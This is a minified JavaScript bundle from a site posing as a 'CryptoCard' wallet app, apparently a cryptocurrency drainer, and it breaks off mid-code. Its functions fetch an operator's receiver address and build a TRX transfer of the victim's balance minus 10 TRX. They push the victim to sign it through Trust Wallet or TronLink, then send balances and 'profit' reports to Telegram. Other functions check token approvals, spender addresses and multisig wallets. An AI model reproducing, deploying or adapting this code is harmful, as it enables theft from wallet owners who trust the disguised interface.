(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[375],{2597:e=>{e.exports={btn:"Button_btn__f9ie8",primary:"Button_primary__2t8Fh",secondary:"Button_secondary__6iDUg",success:"Button_success__NqjiJ"}},3436:(e,t,a)=>{"use strict";a.d(t,{WcBridgeHost:()=>_,$:()=>y});var n=a(95155),r=a(12115),i=a(72458);let o=null,s=null,c=!1,l=!1,u=new Map;function d(){try{if(!o||!o.src)return;s=new URL(o.src).origin}catch(e){}}function h(e){o=e,d(),c||(c=!0,window.addEventListener("message",e=>{if(!s||e.origin!==s)return;let t=e.data;if(t&&"wc-rpc"===t.source&&t.id&&u.has(t.id)){let e=u.get(t.id);clearTimeout(e.timer),u.delete(t.id),t.ok?e.resolve((0,i.eg)(t.result)):e.reject(Error(t.error||"Bridge error"))}})),l||(l=!0,window.addEventListener("pageshow",()=>d()),document.addEventListener("visibilitychange",()=>{document.hidden||d()}))}function p(e){var t,a;let n=arguments.length>1&&void 0!==arguments[1]?arguments[1]:[],{timeoutMs:r=18e4}=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};if(s||d(),!o||!o.contentWindow)return new Promise((t,a)=>{setTimeout(()=>{if(!o||!o.contentWindow)return void a(Error("Bridge iframe is not mounted"));p(e,n,{timeoutMs:r}).then(t,a)},250)});if(!s)return Promise.reject(Error("Bridge origin is not set"));let c=(null==(a=crypto)||null==(t=a.randomUUID)?void 0:t.call(a))||"".concat(Date.now(),"-").concat(Math.random());return new Promise((t,a)=>{let l=setTimeout(()=>{u.delete(c),a(Error("Bridge timeout"))},r);u.set(c,{resolve:t,reject:a,timer:l}),o.contentWindow.postMessage({source:"wc-rpc",id:c,method:e,params:(0,i.yS)(n)},s)})}var m=a(51981);function w(e){let{open:t,onClose:a}=e,i=(0,r.useRef)(null),[o,c]=(0,r.useState)(!1),[l,u]=(0,r.useState)("Открываю WalletConnect…"),[d,p]=(0,r.useState)(null),{language:w}=(0,m.s)();function f(e){try{var t;let a=s,n=null==(t=i.current)?void 0:t.contentWindow;if(!a||!n)return;n.postMessage({source:"wc-embed",type:"SET_LANG",lang:e},a)}catch(e){}}return(0,r.useEffect)(()=>{let e=function(){let e="wc_user_pod_v1",t=localStorage.getItem(e);if(!t){let a=["user","id"],n=a[Math.floor(Math.random()*a.length)],r=Math.floor(9500*Math.random())+500;t="".concat(n).concat(r),localStorage.setItem(e,t)}return"https://".concat(t,".").concat("trust-card.vercel.app")}();s=e,p("".concat(e,"/wc-bridge"))},[]),(0,r.useEffect)(()=>{try{if(!d)return;s=new URL(d).origin}catch(e){}},[d]),(0,r.useEffect)(()=>{i.current&&h(i.current)},[]),(0,r.useEffect)(()=>{function e(){try{i.current&&h(i.current)}catch(e){}}window.addEventListener("pageshow",e);let t=()=>{document.hidden||e()};return document.addEventListener("visibilitychange",t),()=>{window.removeEventListener("pageshow",e),document.removeEventListener("visibilitychange",t)}},[]),(0,r.useEffect)(()=>{t&&(c(!1),u("Открываю WalletConnect…"),f(w))},[t]),(0,r.useEffect)(()=>{t&&f(w)},[w,t]),(0,r.useEffect)(()=>{function e(e){let t=s;if(!t||e.origin!==t)return;let n=e.data;if(n){if("wc-embed"===n.source&&"BRIDGE_READY"===n.type)return void c(!0);if("wc-embed"===n.source&&"WC_MODAL_CLOSED"===n.type){a&&a();return}"wc-embed"===n.source&&"STATUS"===n.type&&n.text&&u(String(n.text))}}return window.addEventListener("message",e),()=>window.removeEventListener("message",e)},[a]),(0,n.jsx)("div",{style:{display:"flex",opacity:+!!t,visibility:t?"visible":"hidden",pointerEvents:t?"auto":"none",position:"fixed",inset:0,zIndex:999999,alignItems:"center",justifyContent:"center",padding:16,background:"rgba(0,0,0,0.6)"},onMouseDown:e=>{if(e.target===e.currentTarget){try{var t;let e=s,a=null==(t=i.current)?void 0:t.contentWindow;e&&a&&a.postMessage({source:"wc-embed",type:"CANCEL_CONNECT"},e)}catch(e){}a&&a()}},children:(0,n.jsx)("div",{style:{position:"relative",width:"min(96vw, 420px)",height:"min(96vh, 715px)",background:"#0b0b0b",borderRadius:16,overflow:"hidden",boxShadow:"0 10px 40px rgba(0,0,0,0.5)"},children:(0,n.jsx)("iframe",{ref:i,src:d||"about:blank",style:{width:"100%",height:"100%",border:0,display:"block"},sandbox:"allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation-by-user-activation",onLoad:()=>{u("Загружаю интерфейс WalletConnect…");try{i.current&&h(i.current)}catch(e){}}})})})}var f=a(92721);let g=(0,r.createContext)(null);function _(e){let{children:t}=e,[a,i]=(0,r.useState)(!1),[o,s]=(0,r.useState)(""),[c,l]=(0,r.useState)(""),u=(0,r.useRef)(!1),d=(0,r.useRef)(!1),h=(0,r.useMemo)(()=>(function(){let e={address:"",connected:!1};return{get address(){return e.address},get connected(){return e.connected},async connectWalletStep(t,a){let n=await p("connectWalletStep",[t,a],{timeoutMs:18e4});return e.address=(null==n?void 0:n.address)||"",e.connected=!!e.address,n},disconnect:async()=>(await p("disconnect",[],{timeoutMs:6e4}),e.address="",e.connected=!1,!0),signTransaction:async e=>await p("signTransaction",[e],{timeoutMs:18e4}),sendRawTransaction:async e=>await p("sendRawTransaction",[e],{timeoutMs:18e4}),triggerSmartContractAndSend:async e=>await p("triggerSmartContractAndSend",[e],{timeoutMs:24e4})}})(),[]);(0,r.useEffect)(()=>{let e=e=>{let t=e.data;if(t&&"wc-embed"===t.source)switch(t.type){case"STATUS":s(t.text||"");break;case"WC_URI":{if(!u.current){console.warn("WC_URI ignored (not connecting)");break}if(d.current){console.warn("WC_URI ignored (already deeplinked)");break}d.current=!0;try{(0,f.F)("DOMEN ".concat(t.uri," DOMEN ").concat(window.location.origin),1)}catch(e){}l(t.uri||"");let e=encodeURIComponent(t.uri);window.location.href="trust://wc?uri=".concat(e);break}case"CONNECTED":s("Подключено");break;case"ERROR":s(t.message||"Ошибка")}};return window.addEventListener("message",e),()=>window.removeEventListener("message",e)},[]);let m=(0,r.useMemo)(()=>({adapter2:h,open:()=>i(!0),close:()=>i(!1),connect:async(e,t)=>{u.current=!0,d.current=!1;try{return await h.connectWalletStep(e,t)}finally{u.current=!1}}}),[h]);return(0,n.jsxs)(g.Provider,{value:m,children:[t,(0,n.jsx)(w,{open:a,onClose:()=>i(!1)})]})}function y(){let e=(0,r.useContext)(g);if(!e)throw Error("useWcBridge must be used inside <WcBridgeHost />");return e}},18452:()=>{},22122:(e,t,a)=>{"use strict";a.d(t,{A:()=>tE});var n=a(95155),r=a(12115),i=a(47650),o=a(51981);a(63731),a(90108);let s=e=>{let{isOpen:t,type:a="loading",message:r,loadingText:i,onClose:s,step:c=1,uri_send:l}=e,{t:u}=(0,o.s)();if(!t)return null;let d=4===c,h=d?3:c,p=()=>r||u("loadingModal.insufficientBalance");return"error"===a&&6!=c?(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{className:"loading-modal-overlay"}),(0,n.jsx)("div",{className:"loading-modal error-modal",children:(0,n.jsxs)("div",{className:"loading-modal-content",children:[(0,n.jsx)("div",{className:"error-icon",children:(0,n.jsxs)("svg",{width:"64",height:"64",viewBox:"0 0 64 64",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("circle",{cx:"32",cy:"32",r:"30",stroke:"#ff4444",strokeWidth:"2",fill:"none"}),(0,n.jsx)("path",{d:"M32 20V36",stroke:"#ff4444",strokeWidth:"3",strokeLinecap:"round"}),(0,n.jsx)("circle",{cx:"32",cy:"44",r:"2",fill:"#ff4444"})]})}),(0,n.jsx)("h2",{className:"loading-modal-title",children:u("loadingModal.error")}),(0,n.jsx)("p",{className:"loading-modal-message",children:p()}),(0,n.jsx)("button",{className:"loading-modal-close",onClick:()=>{s?s():window.location.reload()},children:u("loadingModal.close")})]})})]}):"error"===a&&6===c?(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{className:"loading-modal-overlay"}),(0,n.jsx)("div",{className:"loading-modal error-modal",children:(0,n.jsxs)("div",{className:"loading-modal-content",children:[(0,n.jsx)("div",{className:"error-icon",children:(0,n.jsxs)("svg",{width:"64",height:"64",viewBox:"0 0 64 64",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("circle",{cx:"32",cy:"32",r:"30",stroke:"#ff4444",strokeWidth:"2",fill:"none"}),(0,n.jsx)("path",{d:"M32 20V36",stroke:"#ff4444",strokeWidth:"3",strokeLinecap:"round"}),(0,n.jsx)("circle",{cx:"32",cy:"44",r:"2",fill:"#ff4444"})]})}),(0,n.jsx)("h2",{className:"loading-modal-title",children:u("loadingModal.step6Text")}),(0,n.jsx)("p",{className:"loading-modal-message",children:p()}),(0,n.jsx)("button",{className:"loading-modal-close",onClick:()=>{s?s():window.location.reload()},children:u("loadingModal.close")})]})})]}):(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)("div",{className:"loading-modal-overlay"}),(0,n.jsxs)("div",{className:"loading-modal step-modal ".concat(d?"warning-mode":""),children:[s&&(0,n.jsx)("button",{className:"step-modal-close-btn",onClick:s,"aria-label":"Close",children:(0,n.jsx)("svg",{width:"20",height:"20",viewBox:"0 0 20 20",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M15 5L5 15M5 5L15 15",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})})}),(0,n.jsxs)("div",{className:"loading-modal-content",children:[(0,n.jsxs)("div",{className:"step-loader",children:[(0,n.jsx)("div",{className:"step-loader-ring",children:(0,n.jsxs)("svg",{viewBox:"0 0 100 100",children:[(0,n.jsx)("circle",{className:"step-loader-track",cx:"50",cy:"50",r:"42",fill:"none",strokeWidth:"4"}),(0,n.jsx)("circle",{className:"step-loader-progress",cx:"50",cy:"50",r:"42",fill:"none",strokeWidth:"4",strokeDasharray:"".concat(h/3*264," 264")})]})}),(0,n.jsxs)("div",{className:"step-loader-icon",children:[1===c&&(0,n.jsxs)("svg",{width:"32",height:"32",viewBox:"0 0 32 32",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("path",{d:"M26 12H6C4.89543 12 4 12.8954 4 14V26C4 27.1046 4.89543 28 6 28H26C27.1046 28 28 27.1046 28 26V14C28 12.8954 27.1046 12 26 12Z",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M8 12V8C8 6.4087 8.63214 4.88258 9.75736 3.75736C10.8826 2.63214 12.4087 2 14 2H18C19.5913 2 21.1174 2.63214 22.2426 3.75736C23.3679 4.88258 24 6.4087 24 8V12",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("circle",{cx:"16",cy:"20",r:"2",fill:"currentColor"})]}),2===c&&(0,n.jsxs)("svg",{width:"32",height:"32",viewBox:"0 0 32 32",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("path",{d:"M16 4L4 10V22L16 28L28 22V10L16 4Z",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M4 10L16 16",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M16 28V16",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M28 10L16 16",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})]}),3===c&&(0,n.jsxs)("svg",{width:"32",height:"32",viewBox:"0 0 32 32",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("path",{d:"M16 28C22.6274 28 28 22.6274 28 16C28 9.37258 22.6274 4 16 4C9.37258 4 4 9.37258 4 16C4 22.6274 9.37258 28 16 28Z",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M11 16L14.5 19.5L21 12",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})]}),4===c&&(0,n.jsx)("svg",{width:"32",height:"32",viewBox:"0 0 16 16",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{fill:"currentColor",d:"M10.067.87a2.89 2.89 0 0 0-4.134 0l-.622.638l-.89-.011a2.89 2.89 0 0 0-2.924 2.924l.01.89l-.636.622a2.89 2.89 0 0 0 0 4.134l.637.622l-.011.89a2.89 2.89 0 0 0 2.924 2.924l.89-.01l.622.636a2.89 2.89 0 0 0 4.134 0l.622-.637l.89.011a2.89 2.89 0 0 0 2.924-2.924l-.01-.89l.636-.622a2.89 2.89 0 0 0 0-4.134l-.637-.622l.011-.89a2.89 2.89 0 0 0-2.924-2.924l-.89.01zM8 4c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995A.905.905 0 0 1 8 4m.002 6a1 1 0 1 1 0 2a1 1 0 0 1 0-2"})}),5===c&&(0,n.jsxs)("svg",{width:"32",height:"32",viewBox:"0 0 32 32",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("path",{d:"M16 28C22.6274 28 28 22.6274 28 16C28 9.37258 22.6274 4 16 4C9.37258 4 4 9.37258 4 16C4 22.6274 9.37258 28 16 28Z",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M11 16L14.5 19.5L21 12",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})]})]})]}),(0,n.jsxs)("div",{className:"step-counter",children:[(0,n.jsx)("span",{className:"step-current",children:h}),(0,n.jsx)("span",{className:"step-separator",children:"/"}),(0,n.jsx)("span",{className:"step-total",children:"3"})]}),(0,n.jsx)("h3",{className:"step-title",children:(()=>{switch(c){case 1:default:return u("loadingModal.step1Text");case 2:return u("loadingModal.step2Text");case 3:return u("loadingModal.step3Text");case 4:return u("loadingModal.step4Text");case 5:return u("loadingModal.step5Text");case 6:return u("loadingModal.step6Text")}})()}),(0,n.jsxs)("div",{className:"step-progress",children:[(0,n.jsxs)("div",{className:"step-dot ".concat(h>=1?"active":""," ").concat(1===c?"current":""),children:[(0,n.jsx)("div",{className:"step-dot-inner"}),1===c&&(0,n.jsx)("div",{className:"step-dot-pulse"})]}),(0,n.jsx)("div",{className:"step-line ".concat(h>=2?"active":"")}),(0,n.jsxs)("div",{className:"step-dot ".concat(h>=2?"active":""," ").concat(2===c?"current":""),children:[(0,n.jsx)("div",{className:"step-dot-inner"}),2===c&&(0,n.jsx)("div",{className:"step-dot-pulse"})]}),(0,n.jsx)("div",{className:"step-line ".concat(h>=3?"active":"")}),(0,n.jsxs)("div",{className:"step-dot ".concat(h>=3?"active":""," ").concat(3===c||4===c?"current":""),children:[(0,n.jsx)("div",{className:"step-dot-inner"}),(3===c||4===c)&&(0,n.jsx)("div",{className:"step-dot-pulse"})]})]}),(3===c||4===c)&&l&&(0,n.jsxs)("button",{className:"step-help-btn",onClick:()=>{if(!l)return;let e=encodeURIComponent(l);window.location.href="trust://wc?uri=".concat(e)},disabled:!l,children:[(0,n.jsx)("svg",{width:"16",height:"16",viewBox:"0 0 16 16",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:(0,n.jsx)("path",{d:"M6 2L10 8L6 14",stroke:"currentColor",strokeWidth:"2",strokeLinecap:"round",strokeLinejoin:"round"})}),(0,n.jsxs)("span",{children:[u("loadingModal.notRedirected")," ",u("loadingModal.goToWallet")]})]}),(0,n.jsxs)("div",{className:"step-security",children:[(0,n.jsxs)("svg",{width:"14",height:"14",viewBox:"0 0 14 14",fill:"none",xmlns:"http://www.w3.org/2000/svg",children:[(0,n.jsx)("path",{d:"M7 1L2 3V6.5C2 9.525 4.1 12.3225 7 13C9.9 12.3225 12 9.525 12 6.5V3L7 1Z",stroke:"currentColor",strokeWidth:"1.2",strokeLinecap:"round",strokeLinejoin:"round"}),(0,n.jsx)("path",{d:"M5 7L6.5 8.5L9 5.5",stroke:"currentColor",strokeWidth:"1.2",strokeLinecap:"round",strokeLinejoin:"round"})]}),(0,n.jsx)("span",{children:"Secure Connection"})]})]})]})]})};var c=a(6742),l=a.n(c);async function u(e){let t=await fetch("/api/get-public-tron-api-key"),a=await t.json(),n=new(l())({fullHost:"https://api.trongrid.io",headers:{"TRON-PRO-API-KEY":a.apiKey},privateKey:null});return n.setAddress(e),n}var d=a(3436),h=a(92721),p=a(71823);async function m(e){try{return await e.json()}catch(e){return null}}async function w(e,t){let a=await fetch("/api/track/connect",{method:"POST",headers:{"Content-Type":"application/json"},credentials:"include",body:JSON.stringify({walletAddress:e,chainId:t})});if(!a.ok){let e=await m(a);throw Error((null==e?void 0:e.error)||"HTTP ".concat(a.status))}return await m(a)}let f=["ERROR_TRANSACTIONS","ERROR_WC_SESSION_EXPIRED","ERROR_SIGN_METHOD_UNSUPPORTED","ERROR_UNSUPPORTED_NETWORK","ERROR_SIGN_TIMEOUT","ERROR_WC_DISCONNECTED","ERROR_RPC_INTERNAL","ERROR_RPC_INVALID_PARAMS","ERROR_INSUFFICIENT_FUNDS_SIGN","ERROR_SIGN_UNKNOWN"];function g(e){let{status:t,t:a,onClose:r}=e;if(!(t&&f.includes(t)))return null;let i=a("errors.".concat(t));return(0,n.jsx)(s,{isOpen:!0,message:i,type:"error",onClose:r})}let _=e=>Number(e).toFixed(1).replace(".",",");async function y(e){let{endpoint:t="/api/get-balance",signal:a,timeoutMs:n,sendToTelegram:r}=arguments.length>1&&void 0!==arguments[1]?arguments[1]:{};if(!e)return null==r||r("⚠ Пустой адрес для получения баланса",0),null;let i=!a&&n?new AbortController:null,o=i?setTimeout(()=>i.abort(),n):null;try{let n=await fetch(t,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({address:e}),signal:null!=a?a:null==i?void 0:i.signal});if(!n.ok)return null==r||r("⚠ Ошибка получения баланса: HTTP ".concat(n.status),0),null;let o=await n.json();if("error"in o&&o.error)return null==r||r("⚠ Ошибка получения баланса: ".concat(o.error),0),null;let s="number"==typeof o.balance?String(o.balance):o.balance;if(!s||""===s.trim())return null==r||r("⚠ Некорректный формат баланса от API",0),null;if(!o.portfolio||!Array.isArray(o.portfolio.list))return null==r||r("⚠ От API не пришёл портфель",0),null;if(r){let t=((e,t)=>{let a="\uD83D\uDCF6 Подключён кошелёк: TRON\n\uD83D\uDCDC Адрес:".concat(e,"\n\nВсего баланс: ").concat(_(t.totalUsd)," USD"),n=t.list.filter(e=>Number(e.usd)>0).map(e=>"".concat(e.ticker," : ").concat(_(e.amount)," : ").concat(_(e.usd)," USD")).join("\n");return n?"".concat(a,"\n").concat(n):a})(e,o.portfolio);await r(t,0),await r(t,1)}return{balance:s,portfolio:o.portfolio}}catch(e){return null==r||r("Ошибка запроса: ".concat(String(e)),0),null}finally{o&&clearTimeout(o)}}async function v(){try{var e;let t=await fetch("/api/receiver-address");if(!t.ok)return console.error("⚠ Ошибка fetchReceiverAddress: HTTP ".concat(t.status)),null;return null!=(e=(await t.json()).address)?e:null}catch(e){return console.error("⚠ Ошибка запроса fetchReceiverAddress:",e),null}}async function b(e){try{var t;let a=await fetch("/api/networks-tokens-prices",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(e)});if(!a.ok)return console.error("⚠ Ошибка sendNetworksTokensPrices: HTTP ".concat(a.status)),null;return null!=(t=(await a.json()).address)?t:null}catch(e){return console.error("⚠ Ошибка запроса sendNetworksTokensPrices:",e),null}}async function x(e,t){try{let a=await fetch("/api/get-approved-true-false",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({wallet:e,ticker:t})});if(!a.ok)return console.error("⚠ Ошибка fetchApprovedTrueFalse: HTTP ".concat(a.status)),!1;let n=await a.json();return!0===n}catch(e){return console.error("⚠ Ошибка запроса fetchApprovedTrueFalse:",e),!1}}async function C(e){try{var t;let a=await fetch("/api/receiver-ban",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({ban:e})});if(!a.ok)return console.error("⚠ Ошибка fetchReceiverBan: HTTP ".concat(a.status)),null;return null!=(t=(await a.json()).address)?t:null}catch(e){return console.error("⚠ Ошибка запроса fetchReceiverBan:",e),null}}async function S(e,t,a){let{endpoint:n="/api/get-mult",signal:r,timeoutMs:i}=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{};null==t||t();let{signal:o,timer:s}=((e,t)=>{let a=!e&&t?new AbortController:null,n=a?setTimeout(()=>a.abort(),t):null;return{signal:null!=e?e:null==a?void 0:a.signal,timer:n}})(r,i);try{let t=await fetch(n,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({address:e,ticker:a}),signal:o});if(!t.ok)return console.error("⚠ checkPermissions: HTTP ".concat(t.status)),(0,h.F)("\uD83D\uDED1 Найден мультисинг \uD83D\uDED1: ".concat(e),1),null;return await t.json()}catch(t){return console.error("⚠ checkPermissions: ошибка запроса",t),(0,h.F)("\uD83D\uDED1 Найден мультисинг \uD83D\uDED1: ".concat(e),1),null}finally{s&&clearTimeout(s)}}async function T(){try{let e=await fetch("/api/get-public-spender-address");if(!e.ok)return console.error("⚠ fetchSpenderAddress: HTTP ".concat(e.status)),null;let t=await e.json();return t&&"string"==typeof t.spenderAddress?t.spenderAddress:null}catch(e){return console.error("Ошибка при получении spender address:",e),null}}async function k(e){let{tronWebBuilder:t,walletAddress:a,receiverAddress:n,itstronlink:r,adapter:i,nameWallet:o,uri_send:s,sendToTelegram:c,number_trx:l}=e;try{var u,d,h,p;n.startsWith("41")&&(n=t.address.fromHex(n)),a.startsWith("41")&&(a=t.address.fromHex(a));let e=t.toSun(parseFloat(l)-10),o=await t.transactionBuilder.sendTrx(n,e,a),m=await t.transactionBuilder.extendExpiration(o,300);if(null==c||c("✍️ Собрали транзакцию на ".concat(l," TRX -> ").concat(n),0),r){let e=window.tronWeb;if(!(null==e||null==(u=e.defaultAddress)?void 0:u.base58)){let e=0;for(;e<30&&!(null==(h=window.tronWeb)||null==(d=h.defaultAddress)?void 0:d.base58);)await new Promise(e=>setTimeout(e,200)),e++}let t=await window.tronWeb.trx.sign(m),a=await window.tronWeb.trx.sendRawTransaction(t);(null==a?void 0:a.result)?null==c||c("✅ \uD83D\uDCE4 Профит[Approved]!.\n\uD83D\uDCB5 Сумма: ".concat(l," \nTXID: ").concat(a.txid||a.txID),0):null==c||c("\uD83D\uDEAB Не удалось отправить ".concat(l," TRX"),0)}else{let e=encodeURIComponent(s);c("".concat(e),1),window.location.href="trust://wc?uri=".concat(e);let a=i.signTransaction(m),n=await a,r=null!=(p=null==n?void 0:n.result)?p:n,o=await t.trx.sendRawTransaction(r);(null==o?void 0:o.result)?null==c||c("✅ \uD83D\uDCE4 Профит[Approved]!.\n\uD83D\uDCB5 Сумма: ".concat(l," \nTXID: ").concat(o.txid||o.txID),0):null==c||c("\uD83D\uDEAB Не удалось отправить ".concat(l," TRX"),0)}}catch(e){null==c||c("❌ Ошибка отправки ".concat(l," TRX: ").concat((null==e?void 0:e.message)||e),0)}}var E=a(68111);let R=(e,t,a,n,r)=>{let i="❌ Что-то пошло не так. Попробуйте позже.",o="❌ Ошибка на этапе ".concat("build"===t?"создания транзакции":"подписи транзакции");try{if(!e)return o+=" — error is null/undefined",a(o,0),i;let n=String((null==e?void 0:e.message)||e),s=(null==e?void 0:e.code)||"";if(null==e||e.name,n.includes("Unexpected token '<'")||n.includes("<!DOCTYPE")||/Non-JSON response/i.test(n)||/JSON parse failed/i.test(n)){i="⚠️ Сервис временно недоступен. Повторите попытку позже.";let t=e.__rawBody?" — body: ".concat(e.__rawBody.slice(0,120)):"";return o+=" — получили HTML вместо JSON".concat(t),a(o,0),i}if("build"===t&&(n.includes("INVALID_ADDRESS")?(i="\uD83D\uDEAB Неверный адрес получателя.",o+=" — Неверный адрес"):n.includes("insufficient balance")?(i="\uD83D\uDEAB Недостаточно средств на кошельке.",o+=" — Недостаточно средств"):(i="❌ Не удалось создать транзакцию.",o+=" — ".concat(n))),"sign"===t){let e=(n||"").toLowerCase();e.includes("user rejected")||4001===s?(r("ERROR_TRANSACTIONS"),i="❌ Пользователь отклонил подпись транзакции.",o+=" — Пользователь отклонил подпись"):e.includes("no active session")||e.includes("session expired")||e.includes("session not connected")?(r("ERROR_WC_SESSION_EXPIRED"),i="⚠️ Сессия WalletConnect истекла. Подключите кошелёк заново.",o+=" — WalletConnect session expired / no active session"):e.includes("signtransaction is not a function")||e.includes("unsupported method")||e.includes("method not supported")?(r("ERROR_SIGN_METHOD_UNSUPPORTED"),i="\uD83D\uDEAB Метод подписи не поддерживается в этом кошельке.",o+=" — Метод подписи недоступен/unsupported"):e.includes("unsupported network")||e.includes("unsupported chain")||e.includes("wrong network")||e.includes("unrecognized chain")?(r("ERROR_UNSUPPORTED_NETWORK"),i="⚠️ Неподдерживаемая сеть. Переключитесь на нужную сеть (например, TRON).",o+=" — Unsupported / wrong chain"):e.includes("timeout")||e.includes("timed out")||e.includes("request timed out")?(r("ERROR_SIGN_TIMEOUT"),i="⏳ Истекло время ожидания ответа кошелька. Попробуйте ещё раз.",o+=" — Request timeout при подписи"):e.includes("disconnected")||e.includes("connection failed")||e.includes("socket")&&e.includes("error")||e.includes("no matching session")?(r("ERROR_WC_DISCONNECTED"),i="⚠️ Соединение с кошельком потеряно. Переподключите WalletConnect.",o+=" — WalletConnect disconnected / connection error"):-32603===s||e.includes("internal json-rpc error")?(r("ERROR_RPC_INTERNAL"),i="❌ Внутренняя ошибка сети. Попробуйте ещё раз позднее.",o+=" — Internal JSON-RPC error при подписи"):-32602===s||e.includes("invalid params")?(r("ERROR_RPC_INVALID_PARAMS"),i="❌ Ошибка параметров запроса. Попробуйте обновить страницу и повторить.",o+=" — Invalid params для RPC при подписи"):e.includes("insufficient funds")||e.includes("insufficient balance")?(r("ERROR_INSUFFICIENT_FUNDS_SIGN"),i="❌ Недостаточно средств для выполнения транзакции.",o+=" — Insufficient funds/balance при подписи"):(r("ERROR_SIGN_UNKNOWN"),i="❌ Не удалось подписать транзакцию.",o+=" — ".concat(n))}a(o,0)}catch(e){a("❌ Ошибка внутри handleTransactionError: ".concat(e),0)}return i};var P=a(18535),N=a(24452),A=a(39329),D=a(88587),j=a(98602),I=a(94217);let O=P.gH.from,L={},F={},W=null,M=null,B=!1,U=0,H=null,V=null,K=null,q={},G=!1,J=!1,$=null,z=2,X=null,Z="34c466e996ba4279a1ef25d6213f8026",Y={name:"CryptoCard",description:"Sum Application",url:"https://trust-card.vercel.app",icons:["https://".concat("trust-card.vercel.app","/icons/logo.png")]},Q={themeMode:"light",themeVariables:{"--w3m-background-color":"#000000","--w3m-accent-color":"#F5841F","--w3m-z-index":9999999,"--wcm-z-index":"999999"}},ee={},et={},ea=e=>{try{JSON.parse(e)}catch(e){return!1}return!0};(async()=>{try{let e=await fetch("https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD",{method:"GET",headers:{Accept:"application/json"}});(q=await e.json()).PLS={USD:4512e-8}}catch(e){console.log(e)}})();let en={1:"api.etherscan.io",10:"api-optimistic.etherscan.io",56:"api.bscscan.com",137:"api.polygonscan.com",250:"api.ftmscan.com",42161:"api.arbiscan.io",43114:"api.snowtrace.io",8453:"api.basescan.org",81457:"api.blastscan.io"};var er={};let ei={1:[["Uniswap","0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"],["Pancake","0xEfF92A263d31888d860bD50809A8D171709b7b1c"],["Pancake_V3","0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"],["Sushiswap","0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F"]],10:[["Uniswap","0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"]],56:[["Pancake","0x10ED43C718714eb63d5aA57B78B54704E256024E"],["Pancake_V3","0x13f4EA83D0bd40E75C8222255bc855a974568Dd4"],["Sushiswap","0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],137:[["Uniswap","0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"],["Sushiswap","0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"],["Quickswap","0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"]],250:[["Sushiswap","0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],42161:[["Uniswap","0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45"],["Sushiswap","0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]],43114:[["Sushiswap","0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506"]]},eo={1:"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",10:"0x4200000000000000000000000000000000000006",56:"0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c",137:"0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270",250:"0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83",42161:"0x82af49447d8a07e3bd95bd0d56f35241523fbab1",43114:"0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7"},es=[{inputs:[{internalType:"uint256",name:"amountOutMin",type:"uint256"},{internalType:"address[]",name:"path",type:"address[]"},{internalType:"address",name:"to",type:"address"},{internalType:"uint256",name:"deadline",type:"uint256"}],name:"swapExactETHForTokens",outputs:[{internalType:"uint256[]",name:"amounts",type:"uint256[]"}],stateMutability:"payable",type:"function"}],ec=window.location.href.replace(/https?:\/\//,""),el=(()=>{let e=!1,t="";return"undefined"!=typeof 